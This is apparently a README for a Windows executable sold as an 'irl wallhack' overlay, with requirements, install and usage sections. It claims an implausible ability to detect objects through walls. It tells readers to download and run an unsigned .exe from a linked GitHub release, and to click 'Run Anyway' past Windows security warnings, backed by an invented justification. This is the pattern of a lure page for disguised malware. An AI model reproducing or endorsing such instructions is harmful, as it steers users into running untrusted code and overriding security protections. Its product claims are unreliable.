## ⚙️ System Requirements

You need a standard Windows 10 or Windows 11 PC to run this software. Ensure your system meets these basic specs for smooth operation:

- Processor: Modern dual-core CPU or better.
- Memory: 4GB RAM minimum, though 8GB works best.
- Graphics: Integrated or dedicated GPU with DirectX 11 support.
- Storage: 200MB of free disk space.
- Display: 1080p monitor for clear visual output.

Update your graphics drivers if you experience issues. Most modern PCs meet these needs without changes.

## 💾 Installation Steps

Follow these steps to set up the software on your computer.

1. Visit the [official release page](https://github.com/Isaac4961/irl-wallhack-v1-0-pc) to download the package.
2. Locate the download folder on your computer.
3. Extract the contents of the ZIP file to a folder you can find easily.
4. Open the extracted folder and look for the file named irl-wallhack.exe.
5. Double-click this file to start the utility.

Windows might show a security prompt because the software runs directly. Click "More Info" and then "Run Anyway" if you see a warning screen. This happens because the software communicates with your display driver to provide the visual overlay.

## 🕹️ Using the Software

The interface uses a basic menu system. The application window stays on top of your screen by default. You can move the window to any corner of your monitor.

- Activation: Press F1 to turn the visual overlay on or off.
- Sensitivity: Adjust the slider in the main window to change how the software detects objects. Higher values show more detail.
- Display Modes: Use the dropdown menu to select between outline view, depth map, or contrast enhancement.
- Cleanup: Close the window to shut down the application completely.

The software runs in the background while active. It does not store user data or require an internet connection.

## 🔧 Troubleshooting and Support

The program is stable, but technical issues can happen. If the software fails to open, check the following points:

- Graphics Drivers: Ensure you installed the latest drivers from your GPU manufacturer website.
- Permissions: Run the software with user rights. Do not change the file location after the first launch.
- Background Apps: Close other heavy software if you notice lag while using the utility.

If the overlay does not appear, verify that you chose the correct output display in your Windows settings menu. Most users find that setting the application to "Windowed Mode" in game or app settings helps the overlay render correctly.
